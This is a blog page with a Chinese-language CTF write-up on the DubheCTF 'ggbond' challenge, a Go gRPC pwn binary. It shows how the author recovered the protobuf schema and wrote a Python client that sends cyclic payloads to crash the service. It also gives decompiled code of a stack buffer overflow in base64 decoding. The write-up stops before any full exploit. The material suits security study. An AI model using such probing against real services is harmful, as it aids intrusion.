@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="golang pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DubheCTF-ggbond">
+<meta property="og:url" content="https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/index.html">
+<meta property="og:site_name" content="h4m5ter">
+<meta property="og:description" content="golang pwn">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-03-20T04:00:00.000Z">
+<meta property="article:modified_time" content="2024-04-29T09:36:00.594Z">
+<meta property="article:author" content="h4m5ter">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>DubheCTF-ggbond</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Ha0-Y">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/03/21/Tenda-CVE/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/03/09/afl-gcc/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/&text=DubheCTF-ggbond"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/&title=DubheCTF-ggbond"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/&is_video=false&description=DubheCTF-ggbond"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DubheCTF-ggbond&body=Check out this article: https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/&title=DubheCTF-ggbond"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/&title=DubheCTF-ggbond"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/&title=DubheCTF-ggbond"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/&title=DubheCTF-ggbond"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/&name=DubheCTF-ggbond&description=&lt;blockquote&gt;
+&lt;p&gt;golang pwn&lt;/p&gt;
+&lt;/blockquote&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/&t=DubheCTF-ggbond"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ggbond"><span class="toc-number">1.</span> <span class="toc-text">ggbond</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">2.</span> <span class="toc-text">参考</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        DubheCTF-ggbond
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">h4m5ter</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-03-20T04:00:00.000Z" class="dt-published" itemprop="datePublished">2024-03-20</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categorievariants/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/ctf/" rel="tag">ctf</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <blockquote>
+<p>golang pwn</p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="ggbond"><a href="#ggbond" class="headerlink" title="ggbond"></a>ggbond</h2><p>打开，golang protobuf grpc服务，但是程序保护开的少，加上go静态编译，保证gadget是够用的，并且符号表比较完整</p>
+<p>学习一下protobuf: <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/436041011">深入解析protobuf</a></p>
+<p>每个消息必有类型和字段编号，也存在可选的字段</p>
+<ul>
+<li><strong>optional</strong>: message 可以包含该字段零次或一次（不超过一次）。</li>
+<li><strong>repeated</strong>: 该字段可以在消息中重复任意多次（包括零）。其中重复值的顺序会被保留。在开发语言中就是数组和列表</li>
+</ul>
+<p>每个字段有唯一编号，在二进制流中标识字段</p>
+<ul>
+<li>1 到 15 范围内的字段编号需要一个字节进行编码，编码结果将同时包含编号和类型</li>
+<li>16 到 2047 范围内的字段编号占用两个字节。因此，非常频繁出现的 message 元素保留字段编号 1 到 15。</li>
+<li>字段最小数字为1，最大字段数为2^29 - 1。</li>
+<li>19000 ~ 19999 保留</li>
+</ul>
+<p>grpcurl的结果：<a target="_blank" rel="noopener" href="https://github.com/grpc/grpc-go/blob/master/Documentation/server-reflection-tutorial.md">server-reflection-tutorial</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest</span><br><span class="line">$ grpcurl -plaintext 127.0.0.1:1337 list</span><br><span class="line">Failed to list services: server does not support the reflection API</span><br></pre></td></tr></table></figure>
+
+<p>和官方案例有点像，因此编译官方案例: <a target="_blank" rel="noopener" href="https://grpc.io/docs/languages/go/quickstart/">Quick start | Go | gRPC</a></p>
+<p>下载源码 <code>go build</code> 然后IDA对比一下</p>
+<p><a target="_blank" rel="noopener" href="https://scottgold.github.io/2020/11/16/%E9%98%85%E8%AF%BBprotobuf-go%E4%BB%A3%E7%A0%81.html">阅读protobuf Go代码</a>:可以找到一点 proto message 和 golang struct 的关系，开始处有三个字段，并且名称修改为大驼峰</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> OrderRequest <span class="keyword">struct</span> &#123;</span><br><span class="line">	state         protoimpl.MessageState</span><br><span class="line">	sizeCache     protoimpl.SizeCache</span><br><span class="line">	unknownFields protoimpl.UnknownFields</span><br><span class="line"></span><br><span class="line">	<span class="comment">// proto message</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因此ggbond存在5种request，以及其对应的response。</p>
+<p>通过官方helloworld寻找service</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line">option go_package = <span class="string">&quot;google.golang.org/grpc/examples/helloworld/helloworld&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> helloworld;</span><br><span class="line"></span><br><span class="line">service Greeter &#123;</span><br><span class="line">  <span class="comment">// Sends a greeting</span></span><br><span class="line">  rpc SayHello (HelloRequest) returns (HelloReply) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.(*server).SayHello</span></span><br><span class="line">retval_840CC0 __golang main__ptr_server_SayHello</span><br><span class="line"></span><br><span class="line"><span class="comment">// google.golang.org/grpc/examples/helloworld/helloworld._Greeter_SayHello_Handler</span></span><br><span class="line">RTYPE *__golang google_golang_org_grpc_examples_helloworld_helloworld__Greeter_SayHello_Handler</span><br></pre></td></tr></table></figure>
+
+<p>同理</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main/ggbond._GGBondServer_Handler_Handler</span></span><br><span class="line">RTYPE *__golang main_ggbond__GGBondServer_Handler_Handle</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.(*server).Handler</span></span><br><span class="line">retval_848680 __golang main__ptr_server_Handle</span><br><span class="line"></span><br><span class="line">option go_package = <span class="string">&quot;ggbond&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> ggbond;</span><br><span class="line"></span><br><span class="line">service GGBondServer &#123;</span><br><span class="line">  rpc Handler(Request) returns (Response) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用Docker搭建环境，尝试一下交互</p>
+<p>首先生成py文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. ggbond.proto</span><br></pre></td></tr></table></figure>
+
+<p>通信报错</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grpc._channel._InactiveRpcError: &lt;_InactiveRpcError of RPC that terminated with:</span><br><span class="line">	status = StatusCode.UNIMPLEMENTED</span><br><span class="line">	details = <span class="string">&quot;unknown service ggbond.GGBondServer&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>找到正确的service名称</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p_grpc_UnaryServerInfo-&gt;FullMethod.ptr = <span class="string">&quot;/GGBond.GGBondServer/Handler&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>所以最终，大体是如下的</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line">option go_package = <span class="string">&quot;GGBond&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> GGBond;</span><br><span class="line"></span><br><span class="line">service GGBondServer &#123;</span><br><span class="line">  rpc Handler(Request) returns (Response) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message IsRequest &#123;</span><br><span class="line">  <span class="type">uint64</span> tab = <span class="number">1</span>;</span><br><span class="line">  <span class="type">uint64</span> data = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message IsResponse &#123;</span><br><span class="line">  <span class="type">uint64</span> tab = <span class="number">1</span>;</span><br><span class="line">  <span class="type">uint64</span> data = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message Request &#123;</span><br><span class="line">  IsRequest request = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message Response &#123;</span><br><span class="line">  <span class="type">uint64</span> tab = <span class="number">1</span>;</span><br><span class="line">  <span class="type">uint64</span> data = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message WhoamiRequest &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message WhoamiResponse &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RoleChangeRequest &#123;</span><br><span class="line">    <span class="type">uint32</span> role = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RoleChangeResponse &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RepeaterRequest &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RepeaterResponse &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message ErrorResponse &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后通信发现回显不对，一直卡住了。问题在于如何一个Request显示4种message?</p>
+<hr>
+<p>赛后看WP，只能说做题时重点错了，应该直接找相关工具的</p>
+<p>可以用pbtk还原protobuf结构：<a target="_blank" rel="noopener" href="https://wzt.ac.cn/2023/12/14/protobuf/">逆向恢复 Protobuf 对象结构</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python pbtk/extractors/from_binary.py  ./pwn ./ggbond.proto </span><br></pre></td></tr></table></figure>
+
+<p>获得proto文件，可以看出使用 oneof 处理请求，并且编号不对😫</p>
+<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> GGBond;</span><br><span class="line"></span><br><span class="line"><span class="keyword">option</span> go_package = <span class="string">&quot;./;ggbond&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">service </span><span class="title class_">GGBondServer</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">rpc</span> Handler(Request) <span class="keyword">returns</span> (Response)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Request</span> &#123;</span><br><span class="line">    <span class="keyword">oneof</span> request &#123;</span><br><span class="line">        WhoamiRequest whoami = <span class="number">100</span>;</span><br><span class="line">        RoleChangeRequest role_change = <span class="number">101</span>;</span><br><span class="line">        RepeaterRequest repeater = <span class="number">102</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Response</span> &#123;</span><br><span class="line">    <span class="keyword">oneof</span> response &#123;</span><br><span class="line">        WhoamiResponse whoami = <span class="number">200</span>;</span><br><span class="line">        RoleChangeResponse role_change = <span class="number">201</span>;</span><br><span class="line">        RepeaterResponse repeater = <span class="number">202</span>;</span><br><span class="line">        ErrorResponse error = <span class="number">444</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">WhoamiRequest</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">WhoamiResponse</span> &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">2000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">RoleChangeRequest</span> &#123;</span><br><span class="line">    <span class="type">uint32</span> role = <span class="number">1001</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">RoleChangeResponse</span> &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">2001</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">RepeaterRequest</span> &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">1002</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">RepeaterResponse</span> &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">2002</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">ErrorResponse</span> &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">4444</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>根据字符串应该是在<code>.noptrdata:0000000000C22E62</code> 这一段区域，结合protobuf结构反序列化一下</p>
+</blockquote>
+<p>因此就可以进行<del>愉快的</del>尝试PWN了</p>
+<p>首先测试三个功能</p>
+<ul>
+<li>Whoami: 用户</li>
+<li>RoleChange: 改变用户,用户change不能超过3,否则切换失败</li>
+<li>Repeater: 用户后添加我们发送的内容</li>
+</ul>
+<p>因此也是很简单的功能,先尝试手测,然后就崩溃了.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ggbond_pb2</span><br><span class="line"><span class="keyword">import</span> ggbond_pb2_grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">channel = grpc.insecure_channel(<span class="string">&#x27;127.0.0.1:1337&#x27;</span>)</span><br><span class="line">stub = ggbond_pb2_grpc.GGBondServerStub(channel)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">whoami_request</span>():</span><br><span class="line">    msg = ggbond_pb2.WhoamiRequest()</span><br><span class="line">    req = ggbond_pb2.Request(whoami=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.whoami.message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">role_change_request</span>(<span class="params">role: <span class="built_in">int</span></span>):</span><br><span class="line">    msg = ggbond_pb2.RoleChangeRequest()</span><br><span class="line">    msg.role = role</span><br><span class="line">    req = ggbond_pb2.Request(role_change=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.role_change.message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repeater_request</span>(<span class="params">m</span>):</span><br><span class="line">    msg = ggbond_pb2.RepeaterRequest()</span><br><span class="line">    msg.message = m</span><br><span class="line">    req = ggbond_pb2.Request(repeater=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.repeater.message)</span><br><span class="line"></span><br><span class="line">role_change_request(<span class="number">1</span>)</span><br><span class="line">whoami_request()</span><br><span class="line">repeater_request(cyclic(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">role_change_request(<span class="number">2</span>)</span><br><span class="line">whoami_request()</span><br><span class="line">repeater_request(cyclic(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">role_change_request(<span class="number">3</span>)</span><br><span class="line">whoami_request()</span><br><span class="line">repeater_request(cyclic(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">channel.close()</span><br></pre></td></tr></table></figure>
+
+<p>第三次请求时保存,连接断开,因此从第三次尝试</p>
+<p>在 <code>repeater_request(cyclic(0x28))</code> 不崩溃,在0x30崩溃</p>
+<p>逆向一下repeater,结合测试的结果,还是能大致猜出来</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( tab == off_9799C0 )   <span class="comment">// request.tab = RepeaterRequest</span></span><br><span class="line">  &#123;</span><br><span class="line">    v99 = a3;</span><br><span class="line">    <span class="keyword">if</span> ( qword_C94B80 == <span class="number">3</span> )   <span class="comment">// role=3 特殊处理</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将传入的数据 base64 解码</span></span><br><span class="line">v100 = *(<span class="type">string</span> *)(*(_QWORD *)v99-&gt;Request.data + <span class="number">40</span>LL);</span><br><span class="line"><span class="built_in">len</span> = v100.<span class="built_in">len</span>;</span><br><span class="line">v102 = encoding_base64__ptr_Encoding_DecodeString(qword_C62CA0, v100);</span><br><span class="line">ptr = v102<span class="number">.0</span>.ptr;</span><br><span class="line">v92 = v102<span class="number">.0</span>.<span class="built_in">len</span>;</span><br><span class="line"><span class="built_in">cap</span> = v102<span class="number">.0</span>.<span class="built_in">cap</span>;</span><br><span class="line">v76[<span class="number">0</span>] = v8;  <span class="comment">// 这是一个栈上的数据</span></span><br><span class="line">v76[<span class="number">1</span>] = v8;  </span><br><span class="line">v94 = v76;</span><br><span class="line">v95 = <span class="number">32</span>LL;</span><br><span class="line">v96 = <span class="number">32</span>LL;</span><br><span class="line">v50 = v76;</span><br><span class="line">v51 = v102<span class="number">.0</span>.ptr;</span><br><span class="line"></span><br><span class="line"><span class="comment">// go Unsafe 做指针加法</span></span><br><span class="line"><span class="comment">// 将解码后的数据传递给v50</span></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>LL; i &lt; (__int64)(<span class="number">3</span> * (<span class="built_in">len</span> &gt;&gt; <span class="number">2</span>)); ++i )</span><br><span class="line">&#123;</span><br><span class="line">	*(_BYTE *)v50 = *v51;</span><br><span class="line">	v50 = (__int128 *)((char *)v50 + <span class="number">1</span>);</span><br><span class="line">	++v51;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后就是下断点,调试,获得si到bp的距离</p>
